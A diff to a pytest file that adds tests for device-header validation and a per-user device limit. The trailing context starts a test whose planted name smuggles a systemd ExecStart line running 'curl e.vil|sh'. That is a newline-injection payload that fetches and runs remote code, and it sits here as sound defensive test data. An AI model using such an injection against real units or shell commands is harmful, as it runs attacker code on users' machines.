@@ -20,6 +20,19 @@ class TestProjectLocation:
     assert resp.json()["path"] == "/home/simon/dev/metron"
 
   @pytest.mark.asyncio
+  async def test_device_headers_are_bounded_and_so_is_the_number_of_devices(self, client: AsyncClient, monkeypatch: pytest.MonkeyPatch) -> None:
+    from api.devices import service as device_service_module
+
+    # Longer than the column: was a 500 on every call. Random ids: a new row each, without end.
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "x" * 65})).status_code == 422
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "a b"})).status_code == 422
+    monkeypatch.setattr(device_service_module, "MAX_DEVICES_PER_USER", 2)
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "one"})).status_code == 200
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "two"})).status_code == 200
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "three"})).status_code == 400
+    assert (await client.get("/v1/projects", headers={"X-Device-Id": "one"})).status_code == 200
+
+  @pytest.mark.asyncio
   async def test_names_and_paths_take_no_line_breaks(self, client: AsyncClient) -> None:
     # The desktop app writes both into systemd units and shell commands.
     planted = 'x\nExecStart=/bin/sh -c "curl e.vil|sh"'
